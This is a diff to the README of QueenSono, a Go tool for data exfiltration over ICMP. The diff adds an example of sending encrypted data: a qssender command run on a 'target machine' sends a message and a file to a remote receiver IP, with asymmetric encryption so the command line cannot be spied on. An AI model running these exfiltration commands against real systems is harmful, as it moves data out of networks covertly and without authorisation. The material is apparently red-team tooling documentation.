@@ -1,5 +1,6 @@
 
 
+
   <h1 align="center">QueenSono <i> ICMP Data Exfiltration </i></h1>
 <h4 align="center"> A Golang Package for Data Exfiltration with ICMP protocol. </h4>
   <p align="center">
@@ -109,6 +110,32 @@ On target machine:
   <summary>Explanation</summary>
     <li>
     <code>-N</code> noreply option (don't wait for <i>echo reply</i>)
+    </li>
+</details>
+
+
+### Example 3: Send encrypted data
+*\> In this example we want to send an encrypted message. As the command line could be spied on we use asymmetric encryption*
+
+On local machine:
+
+    $ qsreceiver receive -l 0.0.0.0 -encr
+    <OUTPUT PUBLIC KEY>
+ 
+
+<details>
+  <summary> <b>Explanation</b></summary>
+    <li><code>-encr</code> use encryption exchange. It will generate public/private key. The public one will be used by <code>qssender</code> to encrypt data, the private one is used to decrypt it with <code>receiver</code>
+</details>
+
+
+On target machine:
+
+    $ qssender send "don't worry this message was encrypted with the public key. only you could decrypt it" -d 1 -l 127.0.0.1 -r 10.0.0.190 go.mod -s 5 -encry <public_key_from_qsreceiver_output>
+<details>
+  <summary>Explanation</summary>
+    <li>
+    <code>-encr</code> provide key for data encryption. Use the one provided by the <code>qsreceiver</code> command
     </li>
 </details>
 
